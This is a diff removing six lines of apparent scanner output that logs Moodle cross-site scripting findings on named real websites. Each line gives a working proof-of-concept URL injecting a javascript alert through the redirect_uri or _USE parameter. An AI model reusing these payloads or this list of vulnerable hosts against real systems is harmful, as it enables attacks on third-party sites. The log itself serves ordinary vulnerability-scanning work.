@@ -1,6 +1,0 @@
-[2021-05-16 13:38:23] [moodle-xss] [http] [medium] https://dev-training.ui.com/mod/lti/auth.php?redirect_uri=javascript:alert('1sb4WmQi5xuEziLoRU3R55c8ThI')
-[2021-05-16 13:51:28] [moodle-xss] [http] [medium] https://eacademy.rsvz-inasti.fgov.be/mod/lti/auth.php?redirect_uri=javascript:alert('1sb4WmQi5xuEziLoRU3R55c8ThI')
-[2021-05-16 16:22:37] [moodle-filter-jmol-xss] [http] [medium] https://location-ua.westernunion.com/filter/jmol/iframe.php?_USE=%22};alert(1337);//
-[2021-05-16 16:22:38] [moodle-filter-jmol-xss] [http] [medium] https://location.westernunion.com/filter/jmol/iframe.php?_USE=%22};alert(1337);//
-[2021-05-16 18:28:39] [moodle-xss] [http] [medium] https://sectraining.evernote.com/mod/lti/auth.php?redirect_uri=javascript:alert('1sb4WmQi5xuEziLoRU3R55c8ThI')
-[2021-05-16 20:44:49] [moodle-xss] [http] [medium] https://training.ui.com/mod/lti/auth.php?redirect_uri=javascript:alert('1sb4WmQi5xuEziLoRU3R55c8ThI')
